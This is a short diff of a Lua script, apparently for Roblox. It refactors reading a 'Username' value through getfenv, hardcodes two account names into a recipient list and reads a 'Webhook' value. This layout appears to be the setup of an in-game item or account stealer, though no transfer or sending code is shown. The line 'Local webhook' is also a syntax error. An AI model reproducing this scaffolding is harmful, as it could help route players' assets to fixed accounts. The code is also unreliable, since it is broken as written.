@@ -1,7 +1,10 @@
+local env = getfenv and getfenv()
 local usernames = {}
-if getfenv().Username then
-	table.insert(usernames, getfenv().Username)
+
+if env and env.Username then
+    table.insert(usernames, env.Username)
 end
+
 table.insert(usernames, "namnnni2")
 table.insert(usernames, "BaldBaconFrrr")
 Local webhook = getfenv().Webhook
